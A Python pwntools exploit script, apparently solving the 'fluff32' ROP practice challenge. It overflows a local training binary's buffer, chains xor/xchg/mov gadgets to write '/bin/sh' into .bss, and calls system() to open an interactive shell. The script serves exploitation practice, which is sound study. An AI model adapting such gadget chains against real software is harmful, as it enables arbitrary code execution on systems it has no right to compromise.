from pwn import *

p = process("./fluff32")
context.log_level = 'debug'
sys_addr = 0x08048430
bss_addr = 0x0804a040
#ROP gadgets
pop_ebx = 0x080483e1
xor_edx_edx = 0x08048671
xor_edx_ebx = 0x0804867b
xchg_edx_ecx = 0x08048689
mov_ecxp_edx = 0x08048693

payload = ''
payload += "A"*44
#step1: write bss_addr into ecx
payload += p32(pop_ebx)
payload += p32(bss_addr)
payload += p32(xor_edx_edx)+p32(0)
payload += p32(xor_edx_ebx)+p32(0)
payload += p32(xchg_edx_ecx)+p32(0)
#step2: write /bin into bss
payload += p32(pop_ebx)
payload += "/bin"
payload += p32(xor_edx_edx)+p32(0)
payload += p32(xor_edx_ebx)+p32(0)
payload += p32(mov_ecxp_edx)+p32(0)+p32(0)
#step3: write bss_addr+4 into ecx
payload += p32(pop_ebx)
payload += p32(bss_addr + 4)
payload += p32(xor_edx_edx)+p32(0)
payload += p32(xor_edx_ebx)+p32(0)
payload += p32(xchg_edx_ecx)+p32(0)
#step4: write /sh\x00 into bss
payload += p32(pop_ebx)
payload += "/sh\x00"
payload += p32(xor_edx_edx)+p32(0)
payload += p32(xor_edx_ebx)+p32(0)
payload += p32(mov_ecxp_edx)+p32(0)+p32(0)
#step5: pwn it
payload += p32(sys_addr)
payload += "BBBB"
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()
